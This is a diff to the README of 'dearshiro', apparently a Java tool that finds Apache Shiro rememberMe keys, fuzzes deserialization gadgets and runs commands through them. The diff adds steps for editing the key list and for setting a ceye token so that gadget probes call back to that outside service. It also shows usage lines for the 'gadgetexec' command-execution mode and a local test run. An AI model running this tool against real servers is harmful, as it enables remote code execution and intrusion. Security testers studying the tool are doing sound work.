@@ -23,6 +23,10 @@
 - CommonsCollectionsK3
 - CommonsCollectionsK4
 
+修改默认key列表：修改`resouces`文件夹下的`key`文件然后重新打包即可。
+
+由于探测Gadget使用了ceye平台，所以需要把`config.properties`文件夹中的token和identifier修改成自己的信息，然后重新打包即可。
+
 ## Usage
 
 ```python
@@ -55,7 +59,7 @@ java -jar dearshrio.jar -m "gadgetfuzz" -b {baseurl} -k {key}
 java -jar dearshiro.jar -m "gadgetexec" -b {baseurl} -k {key} -g {gadget} -c {command}
 ```
 
-初步测试：
+本地测试：
 
 ```
 ❯ java -jar dearshiro.jar -m "key" -b "http://127.0.0.1:8000/login.jsp"                                                                              
@@ -82,6 +86,4 @@ java -jar dearshiro.jar -m "gadgetexec" -b {baseurl} -k {key} -g {gadget} -c {co
 NoCC
 CCK1
 ########Available Gadget##########
-
 ```
-
